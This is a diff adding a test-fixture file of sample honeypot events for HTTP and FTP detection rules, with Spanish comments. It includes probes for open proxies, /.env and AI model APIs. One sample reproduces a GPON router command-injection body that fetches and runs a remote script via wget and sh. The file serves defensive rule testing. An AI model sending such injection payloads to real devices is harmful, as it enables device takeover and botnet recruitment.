@@ -1,0 +1,63 @@
+# Eventos de muestra para las reglas HTTP y FTP del honeypot (100340 a 100348).
+# Mismo formato y mismo uso que logtest_ssh_samples.txt: las lineas "#@" dicen que regla tiene que
+# disparar (expect) o no (not). Ver el encabezado de ese archivo.
+# Las IPs y los dominios son de documentacion (RFC 5737 / .test), no son atacantes reales.
+
+# (100340) request normal: solo la base, nivel 2
+#@ expect=100340
+{"timestamp": "2026-10-30 09:10:01", "honeypot_event": "http_request", "ip": "203.0.113.60", "method": "GET", "path": "/"}
+
+# (100341) exploit de router GPON (Muhstik/Mirai): el comando viaja en el cuerpo
+#@ expect=100341
+{"timestamp": "2026-10-30 09:10:02", "honeypot_event": "http_request", "ip": "203.0.113.61", "method": "POST", "path": "/GponForm/diag_Form?images/", "http_body": "XWebPageName=diag&diag_action=ping&dest_host=;wget+http://203.0.113.9/x;sh+x&ipv=0"}
+
+# (100342) busqueda de proxy abierto: URL absoluta
+#@ expect=100342
+{"timestamp": "2026-10-30 09:10:03", "honeypot_event": "http_request", "ip": "203.0.113.62", "method": "GET", "path": "http://proxy.example.test/hachk.php", "user_agent": "Mozilla/5.0"}
+
+# (100342) busqueda de proxy abierto: CONNECT host:puerto
+#@ expect=100342
+{"timestamp": "2026-10-30 09:10:04", "honeypot_event": "http_request", "ip": "203.0.113.63", "method": "CONNECT", "path": "203.0.113.9:443"}
+
+# (100343) handshake T3 de WebLogic, llega como metodo t3
+#@ expect=100343
+{"timestamp": "2026-10-30 09:10:05", "honeypot_event": "http_request", "ip": "203.0.113.64", "method": "t3", "path": "/"}
+
+# (100344) bytes que no son HTTP (handshake TLS en el puerto web)
+#@ expect=100344
+{"timestamp": "2026-10-30 09:10:06", "honeypot_event": "http_request", "ip": "203.0.113.65", "method": "\u0016\u0003\u0001", "path": "/"}
+
+# Un metodo HTTP valido (GET) no es trafico raro: no debe disparar 100344
+#@ expect=100340 not=100344
+{"timestamp": "2026-10-30 09:10:07", "honeypot_event": "http_request", "ip": "203.0.113.66", "method": "GET", "path": "/index.html"}
+
+# (100345) sondeo de aplicacion conocida
+#@ expect=100345
+{"timestamp": "2026-10-30 09:10:08", "honeypot_event": "http_request", "ip": "203.0.113.67", "method": "GET", "path": "/.env"}
+
+# (100348) sondeo de API de modelos de IA: OpenAI, Gemini y Ollama
+#@ expect=100348
+{"timestamp": "2026-10-30 09:10:09", "honeypot_event": "http_request", "ip": "203.0.113.68", "method": "GET", "path": "/v1/models"}
+
+#@ expect=100348
+{"timestamp": "2026-10-30 09:10:10", "honeypot_event": "http_request", "ip": "203.0.113.68", "method": "GET", "path": "/v1beta/models"}
+
+#@ expect=100348
+{"timestamp": "2026-10-30 09:10:11", "honeypot_event": "http_request", "ip": "203.0.113.68", "method": "GET", "path": "/api/tags"}
+
+# Una ruta parecida pero distinta no debe disparar 100348
+#@ expect=100340 not=100348
+{"timestamp": "2026-10-30 09:10:12", "honeypot_event": "http_request", "ip": "203.0.113.69", "method": "GET", "path": "/models"}
+
+# (100346) rafaga: muchos requests de la misma IP en poco tiempo. Umbral 10 en 120 s; se manda 12 veces.
+#@ session=rafaga repeat=12 expect=100346
+{"timestamp": "2026-10-30 09:10:13", "honeypot_event": "http_request", "ip": "203.0.113.70", "method": "GET", "path": "/"}
+
+# (100347) login FTP anonimo
+#@ expect=100347
+{"timestamp": "2026-10-30 09:10:14", "honeypot_event": "ftp_login_attempt", "ip": "203.0.113.71", "username": "anonymous", "password": "guest@example.test"}
+
+# Un login FTP que no es anonimo no debe disparar 100347
+#@ not=100347
+{"timestamp": "2026-10-30 09:10:15", "honeypot_event": "ftp_login_attempt", "ip": "203.0.113.72", "username": "admin", "password": "admin"}
+
